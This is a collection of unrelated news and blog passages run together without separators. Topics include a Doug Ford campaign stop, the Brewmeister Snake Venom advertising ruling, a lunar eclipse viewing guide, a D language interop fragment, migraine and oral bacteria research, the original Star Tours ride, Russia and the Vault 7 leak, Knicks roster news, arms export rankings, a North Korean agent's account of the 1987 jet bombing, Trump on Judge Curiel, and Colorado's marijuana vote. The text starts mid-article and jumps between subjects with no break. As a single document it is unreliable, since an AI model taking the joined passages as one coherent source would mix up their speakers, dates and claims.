“I can't tell you how good I felt after leaving a Walmart store (on Saturday),” Ford said. “Those are the real people.”
Ford has been on a 44-ward tour across the city with a week left to go in the campaign. He and his brother Mayor Rob Ford made the stop at the store Saturday and were overcome by supporters, he said.
“It reminded me at Walmart there of midnight madness,” he said. “But the madness was Rob Ford and Doug Ford and the support of the people in that area.”
Ford was on the tour in massive rented RV, dubbed “Air Ford One” by some in the media.
“I just feel right at home with the people that shop at Walmart because that's where I shop,” Ford said.
If you cast your minds back to the spring, you may vaguely remember that in May I wrote a blog post about a certain Scottish brewery. I'd been passed the results of laboratory analysis of two beers from Brewmeister, the (at the time) ‘supersonic scientists delivering you to drunksville'. The abv of their two most prominent high-strength beers – Armageddon and Snake Venom – had been tested by an HMRC-accredited lab from within the beer industry, with experience of distillation, and found them to come up very short indeed. Armageddon, purportedly 65%abv, came back at 22.8%; and the 67.5% Snake Venom reached 41.1%. As you can imagine, this raised a fair few pertinent questions.
Adding to those, at the same time a blog post appeared on Brewmeister's website from then-MD Lewis Shand stating the company were willing to top up the strength of Snake Venom with pure alcohol, if it had failed to reach the freeze distilled target of 67.5%abv. Again, this was met with widespread incredulity within the industry. Trading Standards investigated the company – as clearly, selling a product that was far short of the advertised alcoholic strength is extremely serious. After the Public Analyst contracted by Moray Council Environmental Health tested a sample of Snake Venom, the council contacted me with their finding:-
‘The Public Analysts report on the current high ABV product, “Snake Venom” beer, was satisfactory, and there was no indication that alcohol had been added to adjust the strength. The alcohol content was within the 1% tolerance allowed by the Food labelling regulations 1996 for a product of this type.'
I asked for a copy of this report, to determine if the analyses conducted were the same as the ones performed in the test that gave Snake Venom as 41% – but the Council, as is their right, declined to send it to me, stating they did not feel releasing the report to be ‘appropriate'. With no way of reconciling these two very different answers in terms of the alcohol by volume of Snake Venom (Armageddon was not mentioned, and doesn't seem to be produced or referred to by Brewmeister any more, either), that was the end of that. Snake Venom again made the papers as the World's Strongest Beer.
As I've said previously, as a company Brewmeister have turned the corner, and with their re-brand and new team, are getting on with making beer. They have a different head brewer in place, and according to their website, a new MD has since come onboard; Mr Shand is listed as Director of Sales and Marketing. They are engaging their drinkers, putting out plenty of press releases about what's going on (the most recent of which, about a Yes/No referendum beer that was produced; although in that vote, Yes won handsomely).
And, we all move on. Today though, a footnote to the story. Brewmeister have been censured by the Advertising Standards Agency for how they referred to Snake Venom online. A complainant (who was not me) challenged the claim that the beer was 67.5%abv, and questioned whether Brewmeister could substantiate this. In response, the brewery provided the Public Analyst report that I had not been privy to, and the ASA considered whether this was enough to satisfy the points that had been raised. Evidently they did not, as their verdict reads:-
While we noted the certificate of analysis provided by Brewmeister showed that the product had an alcohol volume of 67.5%, we also noted it stated that the product had its fermented alcohol content concentrated by a process of freeze distillation and that it was possible that ethyl alcohol had been added to increase its ABV, which we understood, in both cases, was different to the process used for standard beer. Because that was not made clear, we concluded that the ad was misleading.
There's one very interesting word in that paragraph – the certificate of analysis stated it was ‘possible' that ethyl alcohol had been added to Snake Venom; this is very different to ‘no indication' that it had been used. Also, by ruling that a product which has been freeze-distilled is different to a standard beer (which everyone would agree it is), the ASA have ruled Brewmeister to be in breach of the advertising code by referring to it as a beer. This raises further questions on the provenance of these drinks, and whether anyone making them can purport to calling them ‘beer', whether the world's strongest, or not.
The ASA have told Brewmeister to ‘not place undue emphasis on the alcoholic strength of their products' in the future; a move which pretty much rules out more Snake Venom, I would have thought. The entire reason for it existing was to get the brewery noticed, and nobody can argue this hasn't been successful. As a product in their range, Snake Venom has disappeared from Brewmeister's website – it was presumably removed whilst the ASA were considering their verdict. Now the verdict has been delivered, will it ever re-appear? Brewmeister have no need for Snake Venom anymore, however it was made, advertised, or labelled. Other breweries have fallen foul of the ASA in the past, and moved on. Look for Brewmeister to simply do the same.
UPDATE
As per the Publican's Morning Advertiser, Brewmeister released a statement, which reads in part “…we believe it's time to challenge these regulatory bodies which we feel act as a ball and chain weighing down businesses. We declare freedom from its red tape and pointless bureaucracy. While these bodies spend their days investigating hardworking businesses over anonymous complaints from one bored individual, we will continue to make great craft beer our way.
One complaint. One Brewmeister.”

Do you live in North America, South America, Australia, or eastern Asia? Then you get to see a lunar eclipse on the night of April 14–15! And while North America is the best place to watch—we'll get to see the whole event—the real action doesn't begin until 05:58 UTC on the April 15, which is just before 02:00 EDT, so it's a bit late. You might just want to stay up for it, though.
A lunar eclipse is when the Moon slips into the shadow of the Earth and gets dark. Unlike a solar eclipse (where the Moon blocks the Sun) a lunar eclipse lasts for hours and is perfectly safe to observe without protection. In fact, I find using binoculars is best!
How does this work? The Sun lights up the Earth (big duh there), and anything that's illuminated casts a shadow. Normally the Earth's shadow just goes off into space, but sometimes the geometry works out that the Moon passes into it. The Moon has to be opposite the Sun in the sky for that to happen, so lunar eclipses only happen when the Moon is full.
Schematic showing the geometry of a lunar eclipse. not to scale (duh).

The Earth actually casts two shadows; a wide, fuzzy one called the penumbra and a narrower, darker one called the umbra nested inside the penumbra. If the Sun were a point source in the sky (a little dot) there would only be one dark shadow, but because the Sun has a finite extent (that is, we see it as a disk) the geometry is a little more complicated. If you could see the shadows in the sky, the penumbra would be a big circle about five times wider than the Moon, and the umbra would be a circle inside it about half that size.
By taking several exposures during a partial lunar eclipse in 2008, Anthony Ayiomamitis was able to create a mosiac showing the Earth's umbra cast into the sky.

It helps to think of it from the Moon's viewpoint. If you were standing there, looking back at the Earth and Sun, you'd see the Earth (barely; you're seeing it's night side) sliding slowly over the face of the Sun. At the moment the edge of the dark Earth starts to block the sun, you're entering the penumbra. It's getting darker, but most of the Sun is still unblocked, so it's not getting very much darker. About an hour later the Earth completely blocks the Sun, and you've entered the umbra. The Earth is much bigger than the Sun from your point of view (about four times larger) so the Sun stays blocked for a while. Finally, the Sun peeks out the other side of the Earth; you've left the umbra and are in the penumbra again, and things start getting brighter.

What does this mean for us here on Earth? We'll see the Moon enter the penumbra at 04:53 UTC April 15, or 00:53 EDT (53 minutes after midnight). Again, it's no big deal, and you'd hardly notice. But the Moon's edge enters the darker umbra at 05:58 UTC (01:58 EDT) and over the course of a few minutes you'll see that part of the Moon get dark. Over the next hour or so more of the Moon will fall into the Earth's darker shadow, and at 07:06 UTC (03:06 EDT) the entire Moon will be dark. It'll stay that way for the next hour and 18 minutes, until it starts to move out of the umbra at 08:24 UTC (04:24 EDT), and will start to be illuminated by the Sun again. The umbral eclipse ends at 09:33 UTC (05:33 EDT).
Here's a diagram that may help:
How the eclipse will play out; the description is in the text below. Click to embiggen.
Diagram by Fred Espenak/NASA (modified for clarity by Phil Plait)
The Moon moves from right to left in the diagram. The positions are labeled. P1 is when it moves into the penumbra, U1 is when it moves into the umbra, U2 is when it's fully immersed, U3 is when it starts to leave the umbra, U4 is when it's out of the umbra, and P4 when the Moon leaves the penumbra, and the eclipse ends. The times are listed in the lower right in UTC. Subtract four hours for Eastern U.S. time, and so on.
Sometimes when the Moon is fully immersed in the Earth's shadow it can turn an eerie blood red due to the way the Earth's atmosphere scatters light—it's the same reason the Sun can look redder at sunrise and sunset.
Want to hear something poetic? If you were standing on the Moon during the deepest times of the eclipse, from your view you're seeing all the sunrises and sunsets on earth at that moment.
When someone tells you science is cold and emotionless, tell them that.
The only problem with this eclipse is the timing; it happens late Monday night/early Tuesday morning for most of the U.S. But don't let that stop you! If you have clear skies you really should go out and look. And if you have a camera, please take some pictures! With a little planning you can get some amazing shots like the ones I've scattered through this post (see Related Posts below for many more). Check out this incredible time-lapse animation made by Jeffrey Sullivan of a lunar eclipse in 2011:
Observing the Moon with a telescope or binoculars during an eclipse is a wonderful thing, but if you only have your eyes, that's fine too. It's fun to go out every few minutes between U1 and U2 and watch the Moon get eaten by the Earth's arcing shadow.
I hope you have clear skies and good viewing for this event! And if you don't, never fear: There's another one in October, then a third in April 2015, and a fourth in September 2015 too. You'll have plenty of chances to see this lovely astronomical bit of geometrical alignment over the next year and a half.

On the note of inlining C++ into D. I guess this is the domain where we will have to rely on LTO taking you there. Not an advertisable feature though. Catching foreign language exceptions. It's supported but we only act as a messenger. Intercept the thrown exception and pass it on, with the expectation that higher up the backtrace is the C++ or whatever language catch handler to deal with it. I don't see catching or throwing C++ exceptions from D ever happening. At least, you need more help than just mangling and layout.
People who suffer from migraines have long complained that certain foods trigger the severe headaches. New research suggests the culprit might be the amount of bacteria in the mouth.
Researchers found that the mouths of people who suffer from migraines harboured significantly more of the microbes that break down nitrates found in certain foods.
These bacteria play an important role in processing nitrates so they can then be converted into nitric oxide in the bloodstream, which widens blood vessels and improves circulation.
While this process is helpful for cardiovascular health, the findings suggest an abundance of these bacteria may break down nitrates more quickly, causing blood vessels in the brain and scalp to dilate, triggering migraines.
Nitrates are naturally found in a variety of leafy green vegetables, and they are added to processed meat as a preservative and to improve flavour and colour.

Doctors have been telling people who suffer from migraines to avoid processed foods for years. Dr. Michael Zitney, who leads the Headache & Pain Relief Centre in Toronto, says this research strengthens their case.
"We have long since known that these kinds of foods can trigger migraines, but we haven't really known how," he says.
Link to cardiovascular research
The process of how nitrates break down into nitric oxide is well-studied in cardiovascular health.
Nitrate-containing drugs are prescribed to treat chest pain or congestive heart failure. But roughly four out of five cardiac patients who take the drugs report severe headaches as a side-effect.
The study's authors hope these findings will help link existing cardiovascular research with migraines.
"It opens a full area of research and connects two areas of research that have not been connected before," says the study's lead author, Antonio Gonzalez, from the University of California San Diego.
Data collected from 'citizen scientists'
This study was based on data from the American Gut Project, which crowd sources oral and fecal samples from so-called "citizen scientists."
Researchers sequenced bacteria found in 172 oral samples and 1,996 fecal samples. They found that the nitrate-reducing microbes were slightly more abundant in the fecal samples of people who suffer from migraines, but significantly more abundant in their oral samples.
Chronic migraines are frequent, severe, pulsating headaches accompanied by nausea, vomiting, and sensitivity to light and sound. They last anywhere from a few hours to several days.
It's estimated that eight per cent of Canadians have been diagnosed with migraines, although this likely underestimates their prevalence, as some people who suffer from migraines don't seek professional help.
The study's authors say they still need to determine whether the bacteria are a cause or a result of migraines, or are indirectly linked in some other way.
For now, Zitney says, the research suggests that some migraines could one day be treated by controlling the bacteria in our mouths.
"This may be just a glimmer of hope in terms of pursuing possible treatments," he says.
The study was published earlier this week in mSystems, the online journal of the American Society for Microbiology.
This article is about the former versions in the US, France and Japan. For the current Disneyland, Disney's Hollywood Studios, Tokyo Disneyland, and Disneyland Paris attraction, see Star Tours – The Adventures Continue
Star Tours was a motion simulator attraction at several Disney theme parks, based on the successful Star Wars film series created by George Lucas. Set in the Star Wars universe, the attraction sent guests on an excursion trip to Endor, whilst being caught in an altercation between the New Republic and an Imperial Remnant. The attraction featured Captain "Rex" RX-24 along with series regulars R2-D2 and C-3PO.
At its debut at Disneyland in 1987, it was the first attraction based originally on a non-Disney licensed intellectual property. The first incarnation of the ride appeared in Tomorrowland at Disneyland in 1987, replacing the previous attraction, Adventure Thru Inner Space. The attraction had subsequent openings at Tokyo Disneyland, Disney's Hollywood Studios, and Disneyland Paris.
The attraction at Disneyland and Disney's Hollywood Studios closed in 2010 to allow conversion for its successor attraction, Star Tours – The Adventures Continue.[2] The latter location was completed on May 20, 2011. Tokyo Disneyland and Disneyland Paris closed their versions for conversion in 2012 and 2016,[3] marking the original ride's final run of 29 years.[4]
History [ edit ]
Attraction at Disneyland
The ride that became Star Tours first saw light as a proposal for an attraction based on the 1979 Disney live-action film The Black Hole. It would have been an interactive ride-simulator attraction where guests would have had the ability to choose the route. However, after preliminary planning the Black Hole attraction was shelved due to its enormous cost—approximately $50 million USD—as well as the unpopularity of the film itself.
Instead of completely dismissing the idea of a simulator, the company decided to make use of a partnership between Disney and George Lucas, the creator of Star Wars, that began in 1986 with the opening of Captain EO (a 3-D musical film starring Michael Jackson) at the California park. Disney then approached Lucas with the idea for Star Tours. With Lucas' approval, Disney Imagineers purchased four military-grade flight simulators at a cost of $500,000 each and designed the ride structure.
Meanwhile, Lucas and his team of special effects technicians at Industrial Light & Magic produced the first-person perspective film that would be projected inside the simulators. When both simulator and film were completed, a programmer then sat inside and used a joystick to synchronize the movement of the simulator with the apparent movement on screen. On January 9, 1987, at a final cost of $32 million, almost twice the cost of building the entire park in 1955, the ride opened to throngs of patrons, many of whom dressed up as Star Wars characters for the occasion. In celebration, Disneyland remained open for a 60-hour marathon from January 9 at 10 a.m. to January 11 at 10 p.m.
Closing [ edit ]
On August 14, 2010, Walt Disney World hosted the "Last Tour To Endor" event exclusively for Celebration V attendees at Disney's Hollywood Studios from 8pm to 1am. Entertainment features and events at "Last Tour To Endor" included George Lucas, character appearances, Jedi Training Academy, Death Star Disco, Bespin Stage Dance Party, Raiders Of The Lost Jedi Temple of Doom: A Fan Film of Epic Proportions live show, Hyperspace Hoopla, Symphony in the Stars fireworks, and the Star Tours shutdown ceremony. The Star Tours shutdown ceremony was a live show with characters C-3PO, R2-D2, Boba Fett, Darth Vader and a few Stormtroopers, culminating in the official power-down of the original Disney World Star Tours attraction. However, instead of R2-D2 simply shutting it down, Boba Fett destroyed the ride's power supply using a thermal detonator (achieved using pyrotechnics). The ride was still open after the shutdown ceremony until September 7, 2010, when the attraction held its "Final Flight to Endor" exclusive to D23 members.
Attraction [ edit ]
Attraction at Disney's Hollywood Studios
Advertised as "The Ultimate Star Wars Adventure!", Star Tours put the guest in the role of a space tourist en route to the forest moon of Endor, the site of the climactic battle of Return of the Jedi, via the Star Tours travel agency. Much was made of this throughout the ride queue, which was designed to look like a spaceship boarding terminal: posters advertised voyages to different planets, and a giant screen informed riders of the benefits of going to Endor. This area was stocked with Audio-Animatronic characters that seemed to speak to the ride patrons (including C-3PO and R2-D2), as well as a life-size mock-up of a StarSpeeder 3000, the fictional spacecraft which riders were about to board. According to the book Disneyland Detective by Kendra Trahan, the figures of C-3PO and R2-D2 in the Disneyland attraction were actual props from the original film, modified to operate via Audio-Animatronics.
Guests then entered a maintenance area where an apparently underproductive G2 droid performed repairs on another droid while being distracted by the observing guests, and another droid inadvertently pointed out all the supposed flaws of the StarSpeeder 3000 and its RX pilots. The G2 droids were in fact the animatronic skeletons of two geese from the Tomorrowland attraction America Sings. A ride attendant escorted guests to one of several loading stations where they waited for their turn to ride.
A television screen above the queue displayed a countdown to take-off time and showed images of the Starspeeder 3000 spacecraft being serviced. As launch time approached, a safety video was shown featuring Star Wars aliens, Disney Imagineers, and their families. It instructed guests how to fasten their seat belts and where to place belongings. Once the doors to the Starspeeder opened, guests walked across bridges into one of several Starspeeder cabins. As the doors closed, the bumbling pilot droid of the ship, RX-24 or Rex (voiced by Paul Reubens), appeared on the side screen and chatted to the guests about the trip as R2-D2 was loaded onto the spacecraft.
Rex lowered the cockpit shield, and the hangar crew activated the flight platform. All went well until a slight mistake on Captain Rex's part sent the Starspeeder crashing into the maintenance bay doors and plummeting into the maintenance yard. They just barely crashed into the control room and nearly collided with a giant mechanical arm. Once in space, Rex asked R2-D2 to make the jump to lightspeed. However, the ship accidentally passed the Endor moon and instead got caught inside a comet cluster. The ship got hit by several comets before getting trapped in one of the larger comets. The Starspeeder weaved its way through the comet and escaped by crashing through one of the walls. Upon escaping the comet, however, the ship encountered a Star Destroyer of the Imperial Remnant.
The Starspeeder got caught in its tractor beam, but managed to get loose when a New Republic X-wing fighter provided assistance by destroying the tractor beam's generator. Soon the Starspeeder accompanied the Republic fleet on an assault on the Death Star III (later revealed by Leland Chee in 2013 to be a Habitation Sphere disguised as a Death Star in a plot by an Imperial Warlord to distract the New Republic). Rex used the Starspeeder's lasers to eliminate several TIE fighters while a Republic pilot destroyed the Death Star in the same manner as Luke Skywalker by firing two proton torpedoes into the exhaust port. The X-Wings jumped to lightspeed as the Death Star exploded, and a final lightspeed jump sent the Starspeeder back to the spaceport, nearly colliding with a fuel truck in the hangar and sending a Star Tours employee ducking under his desk. As the cockpit shield raised and cut off Rex as he apologized for the near-fatal flight, C-3PO instructed the passengers on the exit procedure and thanked them, oblivious to the perils they just faced. The exit doors opposite the entrance then opened and the passengers proceeded across another set of bridges into the exit hall towards the Star Trader gift shop.

Muren, Gawley, and Keeler were all Industrial Light & Magic computer animation staff. One year earlier, Reubens had voiced the shipboard computer in the Disney film Flight of the Navigator (credited as Paul Mall), in which his character was named Max. Reubens credited this role with his being cast for the ride.[5]
Ride system [ edit ]
Star Tours utilized hydraulic motion base cabins featuring six degrees of freedom, including the ability to move 35 degrees in the X-Y-Z plane. The simulator was patented as Advanced Technology Leisure Application Simulator (ATLAS), originally designed by Rediffusion Simulation[6] in Sussex, England, now owned by Thales Training & Simulation (ex-Thomson-CSF). The Rediffusion 'Leisure' simulator was originally developed for a much simpler show in Canada called "Tour of the Universe", where it featured a single entrance/exit door in the rear of the cabin and a video projector. The film was front-projected onto the screen from a 70 mm film projector located beneath the cockpit barrier. The Disneyland original had four simulators, while the shows in Tokyo Disneyland, Disneyland Paris, and WDW Disney's Hollywood Studio each had six motion bases.
Successor [ edit ]
The successor attraction opened in Disney's Hollywood Studios on May 20, 2011 and at Disneyland on June 3, 2011, replacing the parks' original Star Tours attractions. It features an updated ride system, consisting of a new high-definition video, a Dolby 3D high-definition screen, improved motion simulators and several new special effects and Audio-animatronics.
The attraction is set at an earlier point in the Star Wars timeline[7] (between Revenge of the Sith and A New Hope) and is piloted by C-3PO.[8]

GETTY/PA Experts reveal Russia was behind the latest CIA data dump on Julian Assange's Wikileaks
“Tuesday's data release comes as the CIA investigates Donald Trump's connection to Putin, the Kremlin and Russian hacking during the election campaign. It's all about Russia showing that the CIA is just as bad,” said Dr Andrew Foxall, director of the Russia Centre at the Henry Jackson Institute think tank. More than 9,000 documents detailing the hacking practises of the Central Intelligence Agency were released by Wikileaks on March 7. The classified information contained in “Vault 7” showed that the CIA has produced more than 1,000 malware systems - viruses, trojans, and other software - that can infiltrate and take control of targeted electronics including smart televisions.
Julian Assange has taken a consistently pro-Russia stance Dr Andrew Foxall
It is especially embarrassing because it exposes classified information about the CIA's Center for Cyber Intelligence, the unit assigned by President Obama to respond to fears that Russia's interfered with last year's presidential elections last year. Analysts are now convinced that Wikileaks has a pro-Russia agenda, added Dr Foxall. “When Julian Assange launched Wikileaks in 2006 he was talking about transparency in Eurasia where corruption is rife. But actually it is the US which has been targeted,” he said.
“He claims that Wikileaks has secret Russian intelligence but hasn't disclosed anything remotely sensitive about Russia. He has taken a consistently pro-Russia stance.” Julian Assange this week denied the criticism, labelling his operation as a “neutral, digital Switzerland”. However critics were sceptical over his claim that he had been given the documents by a former US government hacker to begin public debate into hacking. “The documents contained 75,000 redactions. These were codes that would also affect Russia's security,” added Dr Foxall. “Because some of the data was relatively fresh, it is unlikely it had been in the pipeline for a while. And Assange's team is small. The logical conclusion is that the data was given already redacted. “This was the work of a sophisticated team, and it fits entirely into a pattern of behaviour demonstrated by Russia in the past.”
REUTERS Documents detailing the hacking practises of the CIA were released by Wikileaks
That pattern includes using nominally independent pro-Russian groups to carry out cyberattacks. “The Russian state denied having any involvement with the cyberattack on Estonia in 2007, which was blamed on a non-Government youth movement called Nashi,” he said. “Afterwards, whistleblowers from the group revealed they had been taking instructions from Moscow. “It is deliberate policy to blur the lines so that Putin can maintain plausible deniability.” In January, the Office of the Director of National Intelligence confirmed there was a “high confidence that Russian military intelligence relayed material to WikiLeaks.” “My view is that Wikileaks is a tool of the Kremlin. Revelations have repeatedly embarrassed the US and fed Moscow's geopolitical ambition,” said Alina Palykova, of the Washington DC- based Atlantic Council.

“The smoking gun is the fact that Russia also hacked the Republican National Committee at the same time that it infiltrated the Democratic National Committee. Yet not one word about the RNC was released. “Russia didn't even try to cover up its tracks. It suits Putin for Russians to know that he is capable of being such a big player on the world stage. Tampering with elections is massive. It helps with his domestic agenda.” However, the latest cyberattacks were proof that Moscow was becoming disenchanted with the Trump Regime, she said. “The initial elation that existed during the presidential campaign and immediately after Donald Trump was elected has dissipated,” she said. “Putin has become very cautious of President Trump. Moscow holds mixed views over Trump's Russia policy, and the US choice of new ambassador to Moscow has been vilified there.”
GETTY The latest data release comes as the CIA investigates Donald Trump's connection to Russia
She echoed concerns at the timing of the Vault 7 data dump, adding: “Tuesday's Wikileaks dump goes beyond just embarrassing the CIA. Just look at the timing- there is a congressional inquiry into Russian hacking. “What Moscow is doing is undermining western values and principles, and it's part of what the Russian machine has been doing. “There are many Americans who are inherently suspicious of US institutions, and are against surveillance of the population. Showing the extent of the CIA's activities feeds into that.” Last night cyber experts warned that MI6 remained vulnerable to Russian cyberattacks, too. “I am convinced that, based upon the massive number of security vulnerabilities found in commonly deployed systems throughout governments, each and every agency that is targeted will eventually be breached,” said Mike Ahmadi, global director of critical systems Synopsys.

From Sportando:
Thanasis Antetokounmpo decided to turn down for now all the offers arrived from European clubs, because he will attend Knicks' training camp, source told Sportando. The Greek player has received two offers from Italian clubs: Avellino and Varese.
Last we heard, Thanasis was deciding between the D-League and one of those overseas offers, so this is an interesting little detour. Curiously, Italian reports say Antetokounmpo is in the process of signing with Varese, but Sportando's Enea Trapani insists they are mistaken:
Rumors around Antetokounmpo signiñg with Varese are wrong. The player will attend Knicks' training camp, per source. — Enea Trapani (@ETSportando) August 15, 2014
I guess if Thanasis can't crack the Knicks roster in training camp, then comes the decision between one of those Serie A clubs and the D-League. Failure to crack seems like a near certainty since the Knicks already have 15 guys on guaranteed contracts. I don't foresee much open space on this roster barring a lopsided trade, so it's a bit curious that he and the Knicks would bother with a training camp stint with stash options already materialized*. You know, if this is accurate.
Anyway, camp would be a good opportunity for Thanasis to show the organization more of his game and a great opportunity for the Knicks to scrimmage against the long-armed slappiness of their new rookie friend. And he'd just be so much fun to have around.
If and when this becomes official, the Knicks' training camp roster will stand at 16. The camp maximum is 20, but with a hard 15 already in place, New York might not bother to fill that out.
*Important Update: To come to camp with the Knicks, Thanasis would have to sign a contract (probably a non-guaranteed one). If the Knicks were to then cut Thanasis out of camp, they would forfeit his exclusive draft rights. So unless they really think a spot is going to open up for him, bringing Thanasis to camp just for funsies would be a waste of an asset. If the above is true, the Knicks are either up to something or they're short-sighted.
Israel is the world's tenth largest weapons exporting nation, accounting for some three percent of global arms sales, according to a chart published by the Economist magazine on Sunday.
The five leading arms exporters are the United States, Russia, Germany, China and France, which together accounted for three-quarters of international weapons sales over the past five years, according to the Economist.
After the big five, come the United Kingdom, Spain, Ukraine, Italy and Israel.
The magazine based its chart on figures from the Stockholm International Peace Research Institute, which tracks the arms trade.
The biggest arms importers, according to the chart, were India, China, Pakistan, the United Arab Emirates and Saudi Arabia.
The country with the fastest growing weapons trade is China, which has tripled its output in five years - overtaking France and poised to overtake Germany. China sells to 35 mainly low- and middle-income countries, but is also a big importer (two-thirds of its weapons come from Russia.)
The U.S., with 29 percent of the total, exports to over 90 nations, with aircraft making up most of its sales. Russia, with 27 percent of the total, exports more ships than any other country. Its weapons exports have significantly increased, thanks in part to being India's biggest supplier, accounting for three-quarters of its arms purchases.
Overall, sales between 2009 and 2013 were 14% higher than the previous five-year period,

[np_storybar title=”‘I killed a three-star commander': Bloody power struggle behind Kim Jong-un's rise to power revealed” link=”http://news.nationalpost.com/2013/04/10/warring-factions-of-north-korean-army-divided-over-accepting-kim-jong-uns-command-officer-reveals/”%5D
North Korea's army was deeply split over whether to accept the command of Kim Jong-un, a former officer has disclosed, giving a possible clue to the tensions lying behind the young leader's calls to war.
Lieut Kim, 42, said he had been forced to flee the country after he murdered a rival officer as the factions within his army unit battled for control.

A former North Korean spy has recalled her role in blowing up a civilian South Korean jet in 1987 – killing all 115 passengers – after being “plucked” from her schoolyard to work for the regime.
Kim Hyun-hee, who was later captured and tried to kill herself by swallowing cyanide, has come out of hiding to shed light on the regime's warmongering and the desperate attempts by its “inexperienced” leader, Kim Jong-un, to shore up control over the military.
The 51-year-old was given a death sentence after the 1987 attack, in which she and an accomplice managed to plant a bomb on a plane travelling from Baghdad to Seoul via Abu Dhabi.
Despite the death of all 115 passengers on board, she was later pardoned after the South Korean government decided that she had been brainwashed. In an interview from an undisclosed location in South Korea where she lives in fear for her life with her husband and two children, she provided a rare insight into the inner workings of the secretive state and its young leader.
“He's struggling to gain complete control over the military and to win their loyalty,” she told Australia's ABC Television. “That's why he's doing so many visits to military bases, to firm up support. He's also using the nuclear program as a bargaining chip for aid, to keep the public behind him.” She added: “North Korea is a not a state, it's a cult.
“North Korea is using its nuclear programme to keep its people in line and to push South Korea and the United States for concessions,” she said.
Ms Kim said she was first “chosen” to become a spy by party officials who turned up at her school in a black sedan. They told her to pack and gave her one last night with her family before she was given a new name and taken to a mountain spy school to be trained in martial arts, weapons and languages.
“I wasn't even allowed time to say goodbye to my friends,” she said.
“In North Korea, I was taught that our [founding] leader Kim Il-sung was a god. You were taught to put him before your own parents. You learn from early childhood to say 'Thank you, Great Leader' for everything.
“And if you said the wrong thing, even if it was a slip of the tongue, you would end up in the gulag.”
She said that, after eight years of training, she was picked for the mission to blow up the Korean Air jet – a plot devised by the present leader's father, Kim Jong-il, who hoped it would scare foreigners away from the 1988 Olympic Games in Seoul.
Ms Kim teamed up with another North Korean spy, Kim Seung-il, and the two disguised themselves as Japanese father and daughter tourists.
They boarded a flight in Baghdad, planted the bomb in a transistor radio and set it to explode nine hours later.
The pair left the flight when it landed in Abu Dhabi and the bomb went off while the plane was flying to Seoul.
All 115 passengers died, with the bombing prompting the United States to list North Korea as a state sponsor of terrorism.
She and her accomplice were arrested as they tried to leave Bahrain after the authorities realised they were travelling on fake passports. While they were being searched, Kim Seung-il told her they should each swallow cyanide hidden in a packet of cigarettes. He died; she was revived.
She was tried and sentenced to death in South Korea. After driving through the streets of Seoul, she began to realise she had been brainwashed in North Korea. She was later pardoned.
“I saw how modern it was,” she said. “I listened to how the agents around me spoke so freely. This contradicted everything I'd been told in North Korea.”
She was pardoned after the South Korean government decided she was a victim of the Kim cult.
“I regret what I did and am repentant,” she said. “I feel I should not hide the truth to the family members of those who died.”

Donald Trump was repeatedly pressed on Friday about why he continues to bring up a judge's Mexican heritage while saying the judge should recuse himself.
CNN anchor Jake Tapper asked Trump again and again if that was improper or could be construed as racist. The mogul initially avoided the question, but ultimately doubled down on his attack.
“If you are saying he can't do his job because of his race, is that not the definition of racism?” Tapper asked towards the end of the exchange, which will air in full Sunday.
“No, I don't think so at all,” Trump replied.
U.S. District Court Judge Gonzalo Curiel, a federal district judge in the Southern District of California, is overseeing a case against the now-defunct Trump University.
Trump has repeatedly complained about Curiel's supposed bias while invoking the judge's heritage, which has unsettled a number of legal observers. Others have bluntly labeled Trump's criticism as racist.
The presumptive GOP nominee claims that his plan to build a massive wall along the U.S. border with Mexico has resulted in a conflict of interest for Curiel in the case over Trump's for-profit university.
“He's proud of his heritage, OK? I'm building a wall,” Trump told Tapper. “He's a Mexican. We're building a wall between here and Mexico,” he added.
Tapper, however, pointed out that Curiel was born in Indiana.
“We live in a society that's very pro-Mexico, and that's fine. That's all fine,” Trump said at another point in the interview. “But I think he should recuse himself.”
“Because he's a Latino?” Tapper asked.
“I'm building a wall,” Trump maintained.

Voters in this presidential battleground state won't just decide whether to go red or blue this fall but also green -- as in marijuana.
Whether to legalize marijuana will be on the Colorado ballot in November. President Barack Obama and presumptive Republican nominee Mitt Romney have identical stances on pot legalization -- they oppose it. And neither is comfortable talking about it.
Yet Obama and Romney find themselves unwittingly ensnared in the legalization debate -- and both may want to take it more seriously if their race in Colorado is close.
With Colorado politically divided and home to a huge number of independent voters, Obama and Romney are devoting money and manpower to winning its nine electoral votes.
The November ballot question asking Coloradans to legalize marijuana cuts two ways for Obama. It could draw younger voters to the polls, boosting the president and down-ticket Democrats. It also highlights the Obama administration's conflicting signals on states that buck the federal marijuana ban.
Legalization activists are a small but passionate group, and there are signs that some who turned out in large numbers here to campaign for Obama in 2008 have soured on the president, in no small part because of dismal employment prospects for younger workers.
Obama ran into Colorado's roiling pot controversy in April, when he spoke at the University of Colorado in Boulder. He received thunderous cheers when he walked on stage, but when he started with an innocuous thanks to the university chancellor, many students booed. That's because a week before, the chancellor had shut down a large pro-marijuana protest on campus.
On a late-night television interview with Jimmy Fallon that aired the same night, Obama laughed off a question about marijuana legalization. "We're not going to be legalizing weed -- or what -- anytime soon," the president said.
Obama has conceded he used marijuana and cocaine while he was college-age and called their use "bad decisions." An Obama biography to be published this month from David Maraniss of The Washington Post says Obama used pot in high school too, smoking with basketball buddies in a group that called themselves the "Choom Gang."
Romney has never smoked pot or used illegal drugs, a campaign spokeswoman said, and he has called marijuana a "gateway drug." He recently stumbled into the marijuana debate when he visited an oil rig in northeast Colorado and was visibly taken aback when a Denver TV reporter asked him about marijuana.
"Aren't there issues of significance that you'd like to talk about?" Romney replied, his smile not hiding his annoyance.
Activists say the candidates are wrong to overlook the possible importance of marijuana on Colorado ballots.
"The cannabis supporters that I run into throughout the state are very active, they're enthused, they want to see change and they're willing to make it happen. And if I were the president, I'd really want that enthusiasm," said Boulder lawyer Lenny Frieling, chairman of the Colorado chapter of the National Organization for the Reform of Marijuana Laws.
Frieling is a Democrat who supports Obama and donated to his campaign in 2008. But this time, Frieling says, he's sending his money to local candidates in Colorado and elsewhere who are firmly in the pro-legalization camp. He says he'll still vote for Obama -- but he's not giving him more money.
"Obama is just troubling, his switching positions," Frieling said.
That was a reference to a 2009 letter from Obama's attorney general stating that federal law enforcement would generally ignore marijuana users who comply with state pot laws. Yet, in 2012 alone, federal authorities have shut down more than 40 Colorado marijuana dispensaries, even though the dispensaries were complying with state and local law.
Another activist who organizes campaigns on local marijuana ballot questions in Colorado, James McVaney of Larkspur, says he and like-minded young activists support Obama but are less willing to volunteer for his campaign this year, focusing their energies on the marijuana initiative instead.
"I'm for legalization over Obama," McVaney said.
Colorado's past suggests that in extremely close contests, Democrats could benefit when pot is on the ballot.
